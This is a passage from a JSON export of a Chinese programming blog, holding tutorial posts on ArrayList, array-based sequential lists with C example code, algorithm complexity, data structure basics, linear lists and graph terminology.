System.arraycopy(elementData, index+1, elementData, index, numMoved); elementData[--size] = null; // clear to let GC do its work return oldValue;&#125; ArrayList的优缺点ArrayList的优点 ArrayList底层以数组实现，是一种随机访问模式，再加上它实现了RandomAccess接口，因此查找也就是get的时候非常快。 ArrayList在顺序添加一个元素的时候非常方便，只是往数组里面添加了一个元素而已。 根据下标遍历元素，效率高。 根据下标访问元素，效率高。 可以自动扩容，默认为每次扩容为原来的1.5倍。 ArrayList的缺点 插入和删除元素的效率不高。 根据元素下标查找元素需要遍历整个元素数组，效率不高。 线程不安全。 Reference 【数据结构】ArrayList原理及实现学习总结 - https://blog.csdn.net/jianyuerensheng/article/details/51192811 用大白话告诉你ArrayList的底层原理 - https://blog.csdn.net/weixin_36378917/article/details/81812210","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Data Structure】顺序表","date":"2019-05-15T03:40:59.000Z","path":"2019/05/15/【Data-Structure】顺序表/","text":"顺序表顺序表，即线性表的顺序存储结构，是线性表一种实现方式。线性表用于存储逻辑关系为“一对一”的数据，顺序表自然也不例外。 不仅如此，顺序表对数据的物理存储结构也有要求。顺序表存储数据时，会提前申请一整块足够大小的物理空间，然后将数据依次存储起来，存储时做到数据元素之间不留一丝缝隙。 例如，使用顺序表存储集合 {1,2,3,4,5}，数据最终的存储状态如下图所示： 由此我们可以得出，将“具有 ‘一对一’ 逻辑关系的数据按照次序连续存储到一整块物理空间上”的存储结构就是顺序存储结构。 通过观察上图中数据的存储状态，我们可以发现，顺序表存储数据同数组非常接近。其实，顺序表存储数据使用的就是数组。 顺序表的初始化使用顺序表存储数据之前，除了要申请足够大小的物理空间之外，为了方便后期使用表中的数据，顺序表还需要实时记录以下 2 项数据： 顺序表申请的存储容量； 顺序表的长度，也就是表中存储数据元素的个数； 提示：正常状态下，顺序表申请的存储容量要大于顺序表的长度。 因此，我们需要自定义顺序表，C 语言实现代码如下： 12345typedef struct Table&#123; int * head;//声明了一个名为head的长度不确定的数组，也叫“动态数组” int length;//记录当前顺序表的长度 int size;//记录顺序表分配的存储容量&#125;table; 注意，head 是我们声明的一个未初始化的动态数组，不要只把它看做是普通的指针。 接下来开始学习顺序表的初始化，也就是初步建立一个顺序表。建立顺序表需要做如下工作： 给 head 动态数据申请足够大小的物理空间； 给 size 和 length 赋初值； 因此，C 语言实现代码如下： 12345678910111213#define Size 5 //对Size进行宏定义，表示顺序表申请空间的大小table initTable()&#123; table t; t.head=(int*)malloc(Size*sizeof(int));//构造一个空的顺序表，动态申请存储空间 if (!t.head) //如果申请失败，作出提示并直接退出程序 &#123; printf(\"初始化失败\"); exit(0); &#125; t.length=0;//空表的长度初始化为0 t.size=Size;//空表的初始存储空间为Size return t;&#125; 我们看到，整个顺序表初始化的过程被封装到了一个函数中，此函数返回值是一个已经初始化完成的顺序表。这样做的好处是增加了代码的可用性，也更加美观。与此同时，顺序表初始化过程中，要注意对物理空间的申请进行判断，对申请失败的情况进行处理，这里只进行了“输出提示信息和强制退出”的操作，可以根据你自己的需要对代码中的 if 语句进行改进。 通过在主函数中调用 initTable 语句，就可以成功创建一个空的顺序表，与此同时我们还可以试着向顺序表中添加一些元素，C 语言实现代码如下： 1234567891011121314151617181920212223242526272829303132333435363738#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#define Size 5typedef struct Table&#123; int * head; int length; int size;&#125;table;table initTable()&#123; table t; t.head=(int*)malloc(Size*sizeof(int)); if (!t.head) &#123; printf(\"初始化失败\"); exit(0); &#125; t.length=0; t.size=Size; return t;&#125;//输出顺序表中元素的函数void displayTable(table t)&#123; for (int i=0;i&lt;t.length;i++) &#123; printf(\"%d \",t.head[i]); &#125; printf(\"\\n\");&#125;int main()&#123; table t=initTable(); //向顺序表中添加元素 for (int i=1; i&lt;=Size; i++) &#123; t.head[i-1]=i; t.length++; &#125; printf(\"顺序表中存储的元素分别是：\\n\"); displayTable(t); return 0;&#125; 程序运行结果如下： 12顺序表中存储的元素分别是：1 2 3 4 5 可以看到，顺序表初始化成功。 顺序表的基本操作顺序表插入元素向已有顺序表中插入数据元素，根据插入位置的不同，可分为以下 3 种情况： 插入到顺序表的表头； 在表的中间位置插入元素； 尾随顺序表中已有元素，作为顺序表中的最后一个元素； 虽然数据元素插入顺序表中的位置有所不同，但是都使用的是同一种方式去解决，即：通过遍历，找到数据元素要插入的位置，然后做如下两步工作： 将要插入位置元素以及后续的元素整体向后移动一个位置； 将元素放到腾出来的位置上； 例子例如，在 {1,2,3,4,5} 的第 3 个位置上插入元素 6，实现过程如下： 遍历至顺序表存储第 3 个数据元素的位置，如下图所示： 将元素 3 以及后续元素 4 和 5 整体向后移动一个位置，如下图所示： 将新元素 6 放入腾出的位置，如下图所示： 因此，顺序表插入数据元素的 C 语言实现代码如下： 123456789101112131415161718192021222324252627//插入函数，其中，elem为插入的元素，add为插入到顺序表的位置table addTable(table t,int elem,int add)&#123; //判断插入本身是否存在问题（如果插入元素位置比整张表的长度+1还大（如果相等，是尾随的情况），或者插入的位置本身不存在，程序作为提示并自动退出） if (add&gt;t.length+1||add&lt;1) &#123; printf(\"插入位置有问题\"); return t; &#125; //做插入操作时，首先需要看顺序表是否有多余的存储空间提供给插入的元素，如果没有，需要申请 if (t.length==t.size) &#123; t.head=(int *)realloc(t.head, (t.size+1)*sizeof(int)); if (!t.head) &#123; printf(\"存储分配失败\"); return t; &#125; t.size+=1; &#125; //插入操作，需要将从插入位置开始的后续元素，逐个后移 for (int i=t.length-1; i&gt;=add-1; i--) &#123; t.head[i+1]=t.head[i]; &#125; //后移完成后，直接将所需插入元素，添加到顺序表的相应位置 t.head[add-1]=elem; //由于添加了元素，所以长度+1 t.length++; return t;&#125; 注意，动态数组额外申请更多物理空间使用的是 realloc 函数。并且，在实现后续元素整体后移的过程，目标位置其实是有数据的，还是 3，只是下一步新插入元素时会把旧元素直接覆盖。 顺序表删除元素从顺序表中删除指定元素，实现起来非常简单，只需找到目标元素，并将其后续所有元素整体前移 1 个位置即可。 后续元素整体前移一个位置，会直接将目标元素删除，可间接实现删除元素的目的。 例如，从 {1,2,3,4,5} 中删除元素 3 的过程如下图所示： 因此，顺序表删除元素的 C 语言实现代码为： 123456789101112table delTable(table t,int add)&#123; if (add&gt;t.length || add&lt;1) &#123; printf(\"被删除元素的位置有误\"); exit(0); &#125; //删除操作 for (int i=add; i&lt;t.length; i++) &#123; t.head[i-1]=t.head[i]; &#125; t.length--; return t;&#125; 顺序表查找元素顺序表中查找目标元素，可以使用多种查找算法实现，比如说二分查找算法、插值查找算法等。 这里，我们选择顺序查找算法，具体实现代码为： 123456789//查找函数，其中，elem表示要查找的数据元素的值int selectTable(table t,int elem)&#123; for (int i=0; i&lt;t.length; i++) &#123; if (t.head[i]==elem) &#123; return i+1; &#125; &#125; return -1;//如果查找失败，返回-1&#125; 顺序表更改元素顺序表更改元素的实现过程是： 找到目标元素； 直接修改该元素的值； 顺序表更改元素的 C 语言实现代码为： 123456//更改函数，其中，elem为要更改的元素，newElem为新的数据元素table amendTable(table t,int elem,int newElem)&#123; int add=selectTable(t, elem); t.head[add-1]=newElem;//由于返回的是元素在顺序表中的位置，所以-1就是该元素在数组中的下标 return t;&#125; Reference 数据结构概述 - http://data.biancheng.net/intro/","comments":true,"categories":[{"name":"DataStructure","slug":"DataStructure","permalink":"http://swsmile.info/categories/DataStructure/"}],"tags":[{"name":"Data Structure","slug":"Data-Structure","permalink":"http://swsmile.info/tags/Data-Structure/"}]},{"title":"【Algorithm】什么是算法（Algorithm）","date":"2019-05-15T02:13:40.000Z","path":"2019/05/15/【Algorithm】什么是算法/","text":"算法（Algorithm）算法（Algorithm）是解决特定问题求解步骤的的描述，在计算机中表现为指令的有限序列，并且每条指令表示一个或多个操作。 对于给定的问题，是可以有多种算法来解决的。 算法的特性算法具有五个基本特性：输入、输出 、 有穷性、确定性和可行性。 输入输出输入和输出特性比较容易理解， 算法具有零个或多个输入。 尽管对于绝大多数算法来说，输入参数都是必要的，但对于个别情况，如打印 “ hello world ! “ 这样的代码，不需要任何输入参数 3 因 此算法的输入可以是零个。 算法至少有一个或多个输出， 算法是一定需要输出的，不需要输出，你用这个算法干吗?输出的形式可以是打印输出，也可以是返回一个或多个值等。 有穷性有穷性指算法在执行有限的步骤之后，自动结束而不会出现无限循环，并且每一个步骤在可接受的时间内完成。现实中经常会写出死循环的代码，这就是不满足有穷性。 确定性算法的每一步骤都具有确定的含义 ， 不会出现二义性。 算法在一定条件 下，只有一条执行路径，相同的输入只能有唯一的输出结果。算法的每个步骤被精确定义而无歧义。 可行性算法的每一步都必须是可行的，也就是说，每一步都能够通过执行有限次数完成。 可行性意味着算法可以转换为程序上机运行，并得到正确的结果。 算法VS程序很多人误以为程序就是算法，其实不然：算法是解决某个问题的想法、思路；而程序是在心中有算法的前提下编写出来的可以运行的代码。 例如，要解决依次输出一维数组中的数据元素的值的问题，首先想到的是使用循环结构（ for 或者 while ），在有这个算法的基础上，开始编写程序。 所以，算法相当于是程序的雏形。当解决问题时，首先心中要有解决问题的算法，围绕算法编写出程序代码。 有算法一定能解决问题吗？对于一个问题，想出解决的算法，不一定就能解决这个问题。 例如拧螺母，扳手相对于钳子来说更好使（选择算法的过程），但是在拧的过程（编写程序的过程）中发现螺母生锈拧不动，这时就需要另想办法。 为了避免这种情况的发生，要充分全面地思考问题，尽可能地考虑到所有地可能情况，慎重选择算法（需要在实践中不断地积累经验）。 算法效率的度量方法对于一个问题的算法来说，之所以称之为算法，首先它必须能够解决这个问题（称为准确性）。其次，通过这个算法编写的程序要求在任何情况下不能崩溃（称为健壮性）。 如果准确性和健壮性都满足，接下来，就要考虑最重要的一点：通过算法编写的程序，运行的效率怎么样。 运行效率体现在两方面： 算法的运行时间（称为“时间复杂度”，Time complexity） 运行算法所需的内存空间大小（称为”空间复杂度“，Space complexity） 好算法的标准就是：在符合算法本身的要求的基础上，使用算法编写的程序运行的时间短，运行过程中占用的内存空间少，就可以称这个算法是“好算法”。 算法时间复杂度 （The time complexity of algorithm）算法的时间复杂度，也就是算法的时间量度，记作: T (n)=O(f(n))。 它表示随问题规模 n 的增大，算法执行时间的增长率和 f(n)的增长率相同，称作算法的渐近时间复杂度，简称为时间复杂度（Time complexity）。 其申 f (n) 是问题规模 n 的某个函敬。 我们查找一个有 n 个随机数字数组中的某个数字， 最好的情况是第一个数字就是，那么算法的时间复杂度为 0(1)，但也有可能这个数字就在最后一个位置上待着，那么算法的时间复杂度就是 O(n)，这是最坏的一种情况了。 最坏情况运行时间是一种保证，那就是运行时间将不会再坏了。 在应用中，这是一种最重要的需求， 通常， 除非特别指定， 我们提到的运行时间都是最坏情况的运行时间。 而平均运行时间也就是从概率的角度看， 这个数字在每一个位置的可能性是相同的，所以平均的查找时间为 n/2 次后发现这个目标元素。 平均运行时间是所有情况中最有意义的，因为它是期望的运行时间。 对算法的分析，一种方法是计算所有情况的平均值，这种时间复杂度的计算方法称为平均时间复杂度。另一种方法是计算最坏情况下的时间复杂度，这种方法称为最坏时间复杂度。 一般在没有特殊说明的情况下，都是指最坏时间复杂度。 算法空间复杂度算法的空间复杂度通过计算算法所需的存储空间实现，算法空间复杂度的计算公式记作：S(o)= O(f(o)) ，其中，n 为问题的规模，f(n)为语句关于 n 所占存储空间的。 一般情况下， 一个程序在机器上执行时，除了需要存储程序本身的指令、常数、 变量和输入数据外，还需要存储对数据操作的存储单元，若输入数据所占空间只取决 于问题本身，和算法无关，这样只需要分析该算法在实现时所需的辅助单元即可。若算法执行时所帘的辅助空间相对于输入数据量而言是个常数，则称此算法为原地工作，空间复杂度为 0(1) 。 通常， 我们都使用”时间复杂度”来指运行时间的需求，使用”空间复杂度”指空间需求。当不用限定词地使用”复杂度’时，通常都是指时间复杂度。 Reference 数据结构概述 - http://data.biancheng.net/intro/ 算法复杂度分析 - https://www.cnblogs.com/gaochundong/p/complexity_of_algorithms.html 《大话数据结构》","comments":true,"categories":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://swsmile.info/categories/Algorithm/"}],"tags":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://swsmile.info/tags/Algorithm/"}]},{"title":"【Data Structure】什么是数据结构","date":"2019-05-14T13:05:40.000Z","path":"2019/05/14/【Data-Structure】数据结构-什么是数据结构/","text":"什么是数据结构数据（Data）：从计算机的角度来看，数据是所有能被输入到计算机中且能被计算机处理的符号的集合。它是计算机操作的对象的总称，也是计算机处理信息的某种特定的符号表示形式（二进制码的抽象表示？）。 数据对象：数据对象是性质相同的数据元素的集合，是数据的子集。 什么叫性质相同呢，是指数据元素具有相同数量和类型的数据项，比如，人都有姓名、生日、性别等相同的数据项。 数据元素（Data Element）：数据元素是数据中的一个个体，是数据的基本单位，在计算机中通常作为一个整体来进行考虑和处理。 数据项（Data Object）：一个数据元素可以由多个数据项组成。数据项是具有独立含义的数据最小单位。 数据、数据元素、数据项这三个的关系类似表、元组、属性之间的关系，不过表、元组、属性之间具有确定的关系，而数据、数据元素、数据项之间只有层次关系而没有具体的关系。 数据结构的定义数据结构：数据结构是指数据以及数据相互之间的联系，可以看成是相互之间具有某种特定关系的数据元素的集合，因此，可以把数据结构看成是带结构的数据元素的集合。 数据结构包含以下几个方面： 数据元素之间的逻辑关系，即数据的逻辑结构（Logical Structure）。 数据元素及其关系在计算机存储器中的存储方式，即数据的存储结构，也称为数据的物理结构（Physical Structure）。 施加在该数据上的操作，即数据的运算。 所以数据结构由三个部分组成：逻辑结构、物理结构、运算。 数据的逻辑结构（Logical Structure）是从逻辑关系上描述数据（主要是相邻关系，比如栈、队列、链表等），它与数据的存储无关，是独立于计算机的。因此，数据结构可以看作从具体问题中抽象出来的数学模型。 数据的存储结构（Physical Structure）是数据的逻辑结构在计算机存储器中的存储形式，它依赖于特定的计算机语言。 数据的运算是定义在数据的逻辑结构上的，每种逻辑结构都有一组相应的运算。最常用的运算有：检索（查找）、插入、删除、更新、排序等。 逻辑结构是面向问题的，而物理结构就是面向计算机的，其基本的目标就是将数据及其逻辑关系存储到计算机的内存中 。 对于一种数据结构，其逻辑结构总是唯一的，但它可以对应多种存储结构，并且在不同的存储结构中，同一运算的实现过程可能不同。 逻辑结构（Logical Structure）类型在不产生混淆的情况下，通常将逻辑结构简称为数据结构。 数据的逻辑结构主要有以下几类： 集合（set）：集合中的元素相互独立，除了同属于一个集合之外，别无其他关系（集合中的元素不能重复）。 线性结构（linear structure）：线性结构中的节点具有一对一的关系，其特点是开始节点和终端节点都是唯一的，除开始节点和终端节点之外，其余节点有且仅有一个前驱，有且仅有一个后继。 树形结构（tree structure）：树形结构中的节点具有一对多的关系，其特点是每个节点最多只有一个前驱，但可以有多个后继，可以有多个终端节点。 图形结构（graph structure）：图形结构中的节点具有多对多的关系，其特点是每个节点的前驱和后继的数量都可以是任意的。 物理结构/存储结构（Physical Structure）类型物理结构（Physical Structure），也称为存储结构，是指数据的逻辑结构在计算机中的存储形式。 数据是数据元素的集合，那么根据物理结构的定义，实际上就是如何把数据元素存储到计算机的存储器中。存储器主要是针对内存而言的，像硬盘、软盘、光盘等外部存俯器的数据组织通常用文件结构来描述。 数据的存储结构应正确反映数据元素之间的逻辑关系，这才是最为关键的。 数据元素的物理结构（存储结构）形式有四种： 顺序存储（sequence storage） 链式存储（linked storage） 索引存储（indexed storage） 哈希存储（hashing storage） 顺序存储（sequence storage）结构 把逻辑上相邻的节点存储在物理上相邻的存储单元里，节点之间的逻辑关系由存储单元的邻接关系来体现。 这种存储结构其实很简单，说白了 ， 就是排队占位。大家都按顺序排好，每个人占一小段空间，大家谁也别插谁的队 。 我们之前学计算机语言时，数组就是这样的顺序存储结构。当你告诉计算机，你要建立一个有 9 个整型数据的数组时，计算机就在内存中找了片空地， 按照一个整型所占位置的大小乘以 9 ，开辟一段连续的空间，于是第一个数组数据就放在第一个位置，第二个数据放在第二个，这样依次摆放。 优点：节省存储空间，可以实现节点的随机存取（每个节点对应一个序号，由该序号可直接确定节点的存储地址） 缺点：不便于修改（在对节点进行插入、删除的操作时，可能要移动一系列的节点）。 链式存储（linked storage）结构链式存储（linked storage）结构不需要逻辑上相邻的节点在物理位置上也相邻，节点之间的逻辑关系由附加的指针字段表示。 换句话说，链式存储结构是把数据元素存放在任意的存储单元里，这组存储单元可以是连续的，也可以是不连续的 。 数据元素的存储关系并不能反映其逻辑关系，因此需要用一个指针存放数据元素的地址，这样通过地址就可以找到相关联数据元素的位置。 优点：便于修改（在进行插入、删除操作时，只需要修改对应节点的指针域，不必移动节点）。 缺点：存储空间利用率较低（有一部分空间用来存储节点之间的逻辑关系了），不能进行随机存取（因为逻辑上相邻的节点在物理位置上不一定相邻）。 索引存储（indexed storage）结构该方法通常在存储节点信息的同时，还建立附加的索引表。索引表中的每一项称为索引项，索引项的一般形式是：（关键字，地址），其中关键字唯一标识一个节点，地址则是指向该节点的指针。 优点：支持随机访问（因为索引表是顺序存储的，类似于 C 语言中的指针数组），具有较高的数据查询和修改效率（在进行插入、删除运算时，只需移动索引表中对应节点的存储地址，而不必移动节点表中的节点的数据）。 缺点：索引存储的方法增加了索引表，降低了存储空间的利用率。 哈希（或散列）存储（hashing storage）结构该方法根据节点的关键字通过哈希（或散列）函数直接计算出一个值，并将这个值作为该节点的存储地址。 优点：哈希存储方法的优点就是查找数据快（只要给出要查找节点的关键字，就可以立即计算出对应节点的存储地址）。 缺点：哈希存储方法只存储节点的数据，不存储节点之间的逻辑关系。所以，哈希存储方法一般只适合要求能够快速查找和插入的场合。 总结上面 4种基本的存储方法，既可以单独使用，也可以组合起来使用。同一种逻辑结构采用不同的存储方法，可以得到不同的存储结构。选择何种存储结构，主要根据运算方便和算法的时空要求来决定。 Reference 《数据结构教程（第二版）》","comments":true,"categories":[{"name":"DataStructure","slug":"DataStructure","permalink":"http://swsmile.info/categories/DataStructure/"}],"tags":[{"name":"Data Structure","slug":"Data-Structure","permalink":"http://swsmile.info/tags/Data-Structure/"}]},{"title":"【Data Structure】线性表（Linear List）","date":"2019-05-14T05:05:53.000Z","path":"2019/05/14/【Data-Structure】线性表/","text":"线性表（Linear List）基本概念线性表（List）：由零个或多个数据元素组成的有限序列。 线性表是一个序列。 0个元素构成的线性表是空表。 线性表中的第一个元素无前驱，最后一个元素无后继，其他元素有且只有一个前驱和后继。 线性表是有长度的，其长度就是元素个数，且线性表的元素个数是有限的，也就是说，线性表的长度是有限的。 如果用数学语言来进行定义，可如下： 若将线性表记为（a1,…,ai-1,ai,ai+1,…an）,则表中ai-1领先于ai,ai领先于ai+1,称ai-1是ai的直接前驱元素,ai+1是ai的直接后继元素。 特殊的线性表 - 栈（Stack）和队列（Queue）栈和队列是两种比较特殊的线性表。 栈（Stack）栈是一种操作受限制的线性表。其限制是仅允许在线性表的尾部进行添加和删除操作，这一端被称为栈顶，另一端称为栈底。向一个栈添加新元素叫压栈（push），删除元素又称为出栈（pop）。 栈结构如上图所示，像一个木桶，栈中含有 3 个元素，分别是 A、B 和 C，从在栈中的状态可以看出 A 最先进的栈，然后 B 进栈，最后 C 进栈。根据“先进后出”的原则，3 个元素出栈的顺序应该是：C 最先出栈，然后 B 出栈，最后才是 A 出栈。 队列（Queue）队列也是一种操作受限制的线性表。 队列中的元素只能从线性表的一端进，从另一端出，且要遵循“先入先出”的特点，即先进队列的元素也要先出队列。 队列结构如上图所示，队列中有 3 个元素，分别是 A、B 和 C，从在队列中的状态可以看出是 A 先进队列，然后 B 进，最后 C 进。根据“先进先出”的原则，3 个元素出队列的顺序应该是 A 最先出队列，然后 B 出，最后 C 出。 线性表（Linear List）的物理结构逻辑结构（logical structure）和物理结构（physical structure）我们知道，数据结构分为逻辑结构（logical structure）和物理结构（physical structure）， 逻辑结构（logical structure）分为集合结构、线性结构、树形结构和图形结构四大类。 物理结构（physical structure）分为顺序存储结构（sequence storage structure）和链式存储结构（linked storage structure）。 线性表（Linear List）的物理结构线性表（Linear List）是线性结构的一种，那么线性表当然也有物理结构。 从下图中，我们可以看出，线性表存储数据的方式（线性表（Linear List）的物理结构）可分为以下 2 种： 如图中 a) 所示，将数据依次存储在连续的整块物理空间中，这种存储结构称为顺序存储结构（简称顺序表，linear list）； 如图中 b) 所示，数据分散的存储在物理空间中，通过一根线保存着它们之间的逻辑关系，这种存储结构称为链式存储结构（简称链表，linked list）； 前驱和后继数据结构中，一组数据中的每个个体被称为“数据元素”（简称“元素”）。例如，下图显示的这组数据，其中 1、2、3、4 和 5 都是这组数据组的一个元素。 另外，对于具有“一对一”逻辑关系的数据，我们一直在用“某一元素的左侧（前边）或右侧（后边）”这样不专业的词，其实线性表中有更准确的术语： 某一元素的左侧相邻元素称为“直接前驱”，位于此元素左侧的所有元素都统称为“前驱元素”； 某一元素的右侧相邻元素称为“直接后继”，位于此元素右侧的所有元素都统称为“后继元素”； 以下图数据中的元素 3 来说，它的直接前驱是 2 ，此元素的前驱元素有 2 个，分别是 1 和 2；同理，此元素的直接后继是 4 ，后继元素也有 2 个，分别是 4 和 5。 顺序表（Sequence List）- 顺序存储结构的线性表顺序表（Sequence List）是指顺序存储结构的线性表，指的是用一段地址连续的存储单元依次存储线性表的数据元素。 顺序表表现在物理内存中，也就是物理上的存储方式，事实上就是在内存中找个初始地址，然后通过占位的形式，把一定的内存空间给占了，然后把相同数据类型的数据元素依次放在这块空地中。注意，这块物理内存的地址空间是连续的。 顺序表（Sequence List）的存储结构如下图： 顺序表优缺点线性表的顺序存储结构，在存、读取数据时，不管是在哪个位置，时间复杂度都是O(1)。而在插入或者删除时，时间复杂度都是O(n)。 这也就是线性表的顺序存储结构比较适合存取数据，不适合经常插入和删除数据的应用。 优点 无需为了表示表中元素之间的逻辑关系而增加额外的存储空间（相对于链式存储而言）。 可以快速的存取表中任意位置的元素。 缺点 插入和删除操作需要移动大量的元素。 当线性表长度变化较大时，难以确定存储空间的容量。 容易造成存储空间的“碎片”(因为线性表的顺序存储结构申请的内存空间都以连续的，如果因为某些操作（比如删除操作）导致某个部分出现了一小块的不连续内存空间，因为这一小块内存空间太小不能够再次被利用/分配，那么就造成了内存浪费，也就是“碎片”) 链表（Linked List）- 链式存储结构的线性表背景前面我们讲的线性表的顺序存储结构，它最大的缺点就是插入和删除时需要移动大量元素，这显然就需要耗费时间。 那我们能不能针对这个缺陷或者说遗憾提出解决的方法呢？要解决这个问题，我们就得考虑一下导致这个问题的原因！为什么当插入和删除时，就要移动大量的元素？ 原因就在于相邻两元素的存储位置也具有邻居关系，它们在内存中的位置是紧挨着的，中间没有间隙，当然就无法快速插入和删除。 线性表的链式存储结构的特点是用一组任意的存储单元存储线性表的数据元素，这组存储单元可以存在内存中未被占用的任意位置。 也就是说，链式存储结构的线性表由一个或者多个结点（Node）组成。每个节点内部又分为数据域和指针域（链）。数据域存储了数据元素的信息。指针域存储了当前结点指向的直接后继的指针地址。 因为每个结点只包含一个指针域，所以叫做单链表。顾名思义，当然还有双链表。 单向链表（Singly Linked List）单向链表（Singly Linked List）很简单，其在内存中的对象是随机分布的，对象不但存储了一个数据域，还包括一个指针域，指向下一个对象，来确定一组对象的逻辑顺序。 循环链表（Circular Linked List）循环链表（Circular Linked List）也很简单，和单向链表类似，唯一的区别是，只不过循环链表的最后一个对象的next又指向了第一个对象。 双向链表（Doubly Linked List）不但持有next引用，指向下一个对象，还持有一个prev引用，指向上一个对象。 记住双向链表这个图，很重要，下一篇文章我们要讲的LinkedList就是以双向链表的方式实现的。 Reference Java数据结构之线性表-Java那些事儿专栏 - https://juejin.im/post/5a7458925188257a6049699c 数据结构与算法之线性表 - https://www.jianshu.com/p/1174663be688 数据结构概述 - http://data.biancheng.net/intro/","comments":true,"categories":[{"name":"DataStructure","slug":"DataStructure","permalink":"http://swsmile.info/categories/DataStructure/"}],"tags":[{"name":"Data Structure","slug":"Data-Structure","permalink":"http://swsmile.info/tags/Data-Structure/"}]},{"title":"【Data Structure】图（Graph）","date":"2019-05-14T03:54:17.000Z","path":"2019/05/14/【Data-Structure】图-图/","text":"图（Graph）我们知道，数据之间的关系有 3 种，分别是 “一对一”、”一对多” 和 “多对多”，前两种关系的数据可分别用线性表和树结构存储，本节学习存储具有”多对多”逻辑关系数据的结构——图存储结构。 上图所示为存储 V1、V2、V3、V4 的图结构，从图中可以清楚的看出数据之间具有的”多对多”关系。例如，V1 与 V4 和 V2 建立着联系，V4 与 V1 和 V3 建立着联系，以此类推。 与链表不同，图中存储的各个数据元素被称为顶点（而不是节点）。拿图 1 来说，该图中含有 4 个顶点，分别为顶点 V1、V2、V3 和 V4。 图存储结构中，习惯上用 Vi 表示图中的顶点，且所有顶点构成的集合通常用 V 表示，如图 1 中顶点的集合为 V={V1,V2,V3,V4}。 注意，上面所展示的图仅是图存储结构的其中一种，数据之间 “多对多” 的关系还可能用如下图所示的图结构表示： 可以看到，各个顶点之间的关系并不是”双向”的。比如，V4 只与 V1 存在联系（从 V4 可直接找到 V1），而与 V3 没有直接联系；同样，V3 只与 V4 存在联系（从 V3 可直接找到 V4），而与 V1 没有直接联系，以此类推。 因此，图存储结构可细分两种表现类型，分别为无向图（Undirected Graph）和有向图（Directed Graph）。 无向图（Undirected Graph）边（edge）仅仅是两个顶点（vertex）之间的连接。为了和其他图模型相区别，我们将它称为无向图。这是一种最简单的图模型，我们先来看一下它的定义。 图是由一组顶点和一组能够将两个顶点相连的边组成的。 就定义而言，顶点叫什么名字并不重要，但我们需要一个方法来指代这些顶点。一般使用0至V-1 来表示一张含有 V 个顶点的图中的各个顶点。这样约定是为了方便使用数组的索引来编写能够高效 访问各个顶点中信息的代码。用一张符号表来为顶点的名字和 0 到 V-1 的整数值建立一一对应的关系并不困难，因此直接使用数组索引作为结点 的名称更方便且不失一般性（也不会损失什么效率）。我们用 v-w w-v 的记法来表示连接 v 和 w 的边， 是这条边的另一种表示方法。 在绘制一幅图时，用圆圈表示顶点，用连接两个顶点的线段表示边，这样就能直观地看出图的结构。但这种直觉有时也可能会误导我们，因为图的定义和绘出的图像是无关的。例如，下图中的两组图表示的是同一幅图，因为图的构成只有（无序的）顶点和边（顶点对）。 特殊的图。我们的定义允许出现两种简单而特殊的情况， 参见下图： 自环，即一条连接一个顶点和其自身的边； 平行边：连接同一对顶点的两条边。 无环图（Acyclic Graph）无环图是一种不包含环的图。我们将要学习的几个算法就是要找出一幅图中满足一定条件的无环子图。 有向图（Directed Graph）有向图的一个突出特点，边是单向的，即每条边所连接的两个顶点都是一个有序对。 图的基本常识弧头和弧尾有向图中，无箭头一端的顶点通常被称为”初始点”或”弧尾”，箭头直线的顶点被称为”终端点”或”弧头”。 入度（InDegree）和出度（OutDegree）对于有向图中的一个顶点 V 来说，箭头指向 V 的弧的数量为 V 的入度（InDegree，记为 ID(V)）；箭头远离 V 的弧的数量为 V 的出度（OutDegree，记为OD(V)）。 拿下图中的顶点 V1来说，该顶点的入度为 1，出度为 2（该顶点的度为 3）。 (V1,V2) 和 &lt;V1,V2&gt; 的区别无向图中描述两顶点（V1 和 V2）之间的关系可以用 (V1,V2) 来表示，而有向图中描述从 V1 到 V2 的”单向”关系用 &lt;V1,V2&gt; 来表示。 由于图存储结构中顶点之间的关系是用线来表示的，因此 (V1,V2) 还可以用来表示无向图中连接 V1 和 V2 的线，又称为边；同样，&lt;V1,V2&gt; 也可用来表示有向图中从 V1 到 V2 带方向的线，又称为弧。 集合 VR 的含义并且，图中习惯用 VR 表示图中所有顶点之间关系的集合。例如，上面的无向图的集合 VR={(v1,v2),(v1,v4),(v1,v3),(v3,v4)}，上面的有向图的集合 VR={&lt;v1,v2&gt;,&lt;v1,v3&gt;,&lt;v3,v4&gt;,&lt;v4,v1&gt;}。 路径和回路无论是无向图还是有向图，从一个顶点到另一顶点途径的所有顶点组成的序列（包含这两个顶点），称为一条路径。如果路径中第一个顶点和最后一个顶点相同，则此路径称为“回路”（或”环”）。 并且，若路径中各顶点都不重复，此路径又被称为“简单路径”；同样，若回路中的顶点互不重复，此回路被称为“简单回路”（或简单环）。 拿上图来说，从 V1 存在一条路径还可以回到 V1，此路径为 {V1,V3,V4,V1}，这是一个回路（环），而且还是一个简单回路（简单环）。 在有向图中，每条路径或回路都是有方向的。 权和网在某些实际场景中，图中的每条边（或弧）会赋予一个实数来表示一定的含义，这种与边（或弧）相匹配的实数被称为“权”，而带权的图通常称为网，或者成为加权图（Weighted Graph）。如下图所示，就是一个网结构： 而带有权的有向图，就称为加权有向图（Weighted Directed Graph）。 子图：指的是由图中一部分顶点和边构成的图，称为原图的子图。 图存储结构的分类根据不同的特征，图又可分为完全图，连通图、稀疏图和稠密图。 完全图完全图：若图中各个顶点都与除自身外的其他顶点有关系，这样的无向图称为完全图（如下图）。同时，满足此条件的有向图则称为有向完全图（下图）。 具有 n 个顶点的完全图，图中边的数量为 n(n-1)/2；而对于具有 n 个顶点的有向完全图，图中弧的数量为 n(n-1)。 稀疏图和稠密图稀疏图和稠密图：这两种图是相对存在的，即如果图中具有很少的边（或弧），此图就称为“稀疏图”；反之，则称此图为“稠密图”。 稀疏和稠密的判断条件是：e&lt;nlogn，其中 e 表示图中边（或弧）的数量，n 表示图中顶点的数量。如果式子成立，则为稀疏图；反之为稠密图。 连通图图中从一个顶点到达另一顶点，若存在至少一条路径，则称这两个顶点是连通着的。例如下图中，虽然 V1 和 V3 没有直接关联，但从 V1 到 V3 存在两条路径，分别是 V1-V2-V3和 V1-V4-V3，因此称 V1 和 V3 之间是连通的。 无向图中，如果任意两个顶点之间都能够连通，则称此无向图为连通图。例如，下图中的无向图就是一个连通图，因为此图中任意两顶点之间都是连通的。 